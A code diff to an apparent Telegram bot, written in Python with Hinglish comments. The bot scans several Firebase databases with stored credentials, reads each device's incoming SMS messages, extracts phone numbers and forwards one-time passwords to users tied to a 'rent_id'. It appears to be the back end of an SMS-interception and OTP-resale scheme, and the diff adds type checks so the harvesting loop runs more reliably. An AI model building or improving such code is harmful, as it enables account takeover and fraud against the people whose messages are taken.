@@ -7,7 +7,6 @@ from utils.ui import sc
 log = logging.getLogger("Scanner")
 
 async def send_otp_to_user(bot, uid, service, otp, msg_text, rent_id, phone_number):
-    # 🔥 Fix: Agar number unknown hai to +91 mat lagao
     num_display = f"+91{phone_number}" if phone_number and phone_number != "Unknown" else "Unknown"
     
     otp_msg = (
@@ -100,7 +99,7 @@ async def start_scanner(bot):
             log.error(f"Scanner error: {e}")
             await asyncio.sleep(1.0)
 
-# 🔥 BACKGROUND BACKUP SCANNER
+# 🔥 BACKGROUND BACKUP SCANNER (FIXED)
 async def backup_scanner():
     log.info("Backup Scanner Started...")
     while True:
@@ -111,14 +110,20 @@ async def backup_scanner():
                 random.shuffle(fbs)
                 for fb in fbs[:2]:
                     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
-                    if not clients: continue
+                    if not clients or not isinstance(clients, dict): continue
+                    
                     dev_ids = list(clients.keys())
                     random.shuffle(dev_ids)
+                    
                     for dev_id in dev_ids[:10]: 
+                        dev_data = clients.get(dev_id)
+                        # 🔥 FIX: Agar dev_data dict nahi hai, toh skip karo
+                        if not isinstance(dev_data, dict): continue
+                        
                         msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
                         if msgs:
                             msgs_list = [v for k, v in msgs.items() if isinstance(v, dict) and v.get("type") == "incoming"]
-                            best_nums = fbu.extract_best_numbers(clients[dev_id], msgs_list)
+                            best_nums = fbu.extract_best_numbers(dev_data, msgs_list)
                             if best_nums:
                                 nums = [n for n, c in best_nums]
                                 if "device_backups" not in d: d["device_backups"] = {}
